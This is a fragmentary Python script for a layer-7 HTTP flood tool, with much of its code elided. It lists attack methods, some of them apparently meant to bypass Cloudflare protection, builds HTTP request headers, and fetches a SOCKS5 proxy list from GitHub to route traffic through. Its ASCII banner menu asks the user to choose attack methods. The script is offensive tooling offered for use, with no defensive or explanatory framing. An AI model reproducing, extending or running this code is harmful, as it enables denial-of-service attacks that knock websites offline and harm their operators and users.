...
l7 = ["CFB","GET","NULL","POST","HEAD","POSTV2","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","BYPASS","BYPASSV2","CFBV2","HTTP_BETA","CFUAM","BROWSERENGINE"]
l4 = []
l3 = [""]
to = [""]
ot = [""]
...
def Headers(method):
    header = ""
    if method == "get" or method == "getv2" or method == "socket" or method == "httpfast" or method == "httpfastv2" or method == "head":
        ...
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "spammer" or method == "postv2" or method == "post":
...
def downloadsocks(choice):
    ...
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://raw.githubusercontent.com/pvyon3/socks5c/main/socks5mh.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
...
def usge():
    ...
    print(color.CYAN  + "               ╚╗╔╝  ║║ ║║ ║║╚╗ ║ ║╔══╝"+ color.END) 
    print(color.CYAN  + "                ║║   ║╚═╝║ ║║ ║ ║ ║╚══╗"+ color.END) 
    print(color.CYAN  + "                ╚╝   ╚═══╝ ╚╝ ╚═╝ ╚═══╩═➤ LAYER7" + color.END) 
    print(color.CYAN  + "             ══╦══════════════════════════╦══"+ color.END) 
    print(color.CYAN  + "               ╚╦════════════════════════╦╝"+ color.END)
    print(color.CYAN  + "   ╔════════════╩════════════════════════╩═════════════╗"+ color.END) 
    print(color.CYAN  + "   ║       Choose The Methods For The Attack           ║"+ color.END) 
    print(color.CYAN  + "   ╠════════════════╦════════════════╦═════════════════╣"+ color.END) 
    print(color.CYAN  + "   ║ •GETV2         ║  •CFUAM        ║   •HTTPFAST     ║"+ color.END)    
    print(color.CYAN  + "   ║ •POST          ║  •CFBV2        ║   •HTTPFASTV2   ║"+ color.END) 
    print(color.CYAN  + "   ║ •NULL          ║  •CFB          ║   •BYPASSV2     ║"+ color.END) 
    print(color.CYAN  + "   ║                ║                ║   •BYPASS       ║"+ color.END) 
    print(color.CYAN  + "   ║                ║                ║                 ║"+ color.END) 
    print(color.CYAN  + "   ╚════════════════╩════════════════╩═════════════════╝"+ color.END)
